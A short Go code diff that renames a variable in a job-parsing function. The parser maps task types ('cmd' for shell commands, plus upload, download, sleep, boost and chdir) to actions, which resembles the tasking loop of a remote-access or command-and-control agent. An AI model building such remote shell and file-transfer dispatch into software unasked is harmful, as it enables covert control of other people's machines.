@@ -35,18 +35,18 @@ func (j *Job) parse() (JobType, []string) {
 	}
 	jobType := values[0]
 	jobArgs := values[1:]
-	jobArgsN := len(jobArgs)
+	n := len(jobArgs)
 	if jobType == "cmd" {
 		return SHELL_CMD, jobArgs
-	} else if jobType == "upload" && jobArgsN == 1 {
+	} else if jobType == "upload" && n == 1 {
 		return UPLOAD, jobArgs
-	} else if jobType == "download" && jobArgsN == 2 {
+	} else if jobType == "download" && n == 2 {
 		return DOWNLOAD, jobArgs
-	} else if jobType == "sleep" && jobArgsN == 1 {
+	} else if jobType == "sleep" && n == 1 {
 		return SLEEP, jobArgs
-	} else if jobType == "boost" && jobArgsN == 1 {
+	} else if jobType == "boost" && n == 1 {
 		return BOOST, jobArgs
-	} else if jobType == "chdir" && jobArgsN == 1 {
+	} else if jobType == "chdir" && n == 1 {
 		return CHDIR, jobArgs
 	}
 	return UNKNOWN, nil
